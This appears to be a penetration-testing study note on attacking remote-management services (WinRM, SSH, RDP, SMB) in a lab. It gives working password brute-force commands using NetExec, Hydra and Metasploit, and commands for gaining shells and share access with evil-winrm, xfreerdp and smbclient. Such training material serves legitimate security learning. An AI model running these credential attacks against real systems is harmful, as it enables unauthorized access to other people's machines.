
## Overview
During penetration tests, various network services are encountered, each managed by specific users and permissions. Common services include FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, and LDAP.

## Remote Management on Windows
To manage Windows servers remotely, services like RDP, WinRM, and SSH are used. SSH is more common on Linux, while RDP and WinRM are typical for Windows.

### WinRM
- **Description:** Microsoft’s implementation of WS-Management, based on SOAP, for remote management.
- **Ports:** 5985 (HTTP), 5986 (HTTPS)
- **Security:** Must be manually enabled and configured; often uses certificates or specific authentication.
- **Tool:** NetExec can be used for password attacks and supports multiple protocols.

#### NetExec Usage
- **Install:** `sudo apt-get -y install netexec`
- **Help:** `netexec -h`
- **Protocols Supported:** nfs, ftp, ssh, winrm, smb, wmi, rdp, mssql, ldap, vnc
- **Example:**  


netexec winrm 10.129.42.197 -u user.list -p password.list
Look for `(Pwn3d!)` to confirm successful login.

#### Evil-WinRM
- **Install:** `sudo gem install evil-winrm`
- **Usage:**  
```shell
evil-winrm -i <target-IP> -u <username> -p <password>

```


Provides a PowerShell session if login is successful.

---

## SSH (Secure Shell)
- **Purpose:** Secure remote command execution and file transfer.
- **Port:** 22
- **Encryption:** Uses symmetric (e.g., AES), asymmetric (public/private keys), and hashing for authentication and data integrity.

### Brute Forcing SSH
- **Tool:** Hydra
- **Example:**  
```shell
hydra -L user.list -P password.list ssh://10.129.42.197
```


- **Login:**  
```

ssh user@10.129.42.197

```



---

## Remote Desktop Protocol (RDP)
- **Purpose:** Remote GUI access to Windows systems.
- **Port:** 3389
- **Clients:** Remmina, xfreerdp

### Brute Forcing RDP
- **Tool:** Hydra
- **Example:**  
```

hydra -L user.list -P password.list rdp://10.129.42.197

```


- **Connect:**  
```

xfreerdp /v:10.129.42.197 /u:user /p:password

```



---

## SMB (Server Message Block)
- **Purpose:** File, directory, and printer sharing in Windows networks.
- **Port:** 445
- **Variants:** Also known as CIFS; Samba is the open-source implementation.

### Brute Forcing SMB
- **Tool:** Hydra
- **Example:**  
```

hydra -L user.list -P password.list smb://10.129.42.197

```


- **Note:** If you encounter errors, update Hydra or use Metasploit.

### Metasploit for SMB
- **Module:** `auxiliary/scanner/smb/smb_login`
- **Set options:**  
```

set user_file user.list set pass_file password.list set rhosts 10.129.42.197 run

```



### Enumerating SMB Shares
- **Tool:** NetExec
- **Example:**  
```

netexec smb 10.129.42.197 -u "user" -p "password" --shares

```


Lists available shares and permissions.

### Accessing SMB Shares
- **Tool:** smbclient
- **Example:**  
```

smbclient -U user \\10.129.42.197\SHARENAME

```


Allows file listing, upload, and download if permissions allow.

---

## Summary Table

| Service | Default Port | Common Tools         | Notes                                  |
|---------|--------------|---------------------|----------------------------------------|
| WinRM   | 5985/5986    | NetExec, Evil-WinRM | Manual activation, SOAP-based          |
| SSH     | 22           | Hydra, OpenSSH      | Key-based or password authentication   |
| RDP     | 3389         | Hydra, xfreerdp     | GUI access, certificate warnings       |
| SMB     | 445          | Hydra, NetExec, smbclient, Metasploit | File/printer sharing, Samba variant   |
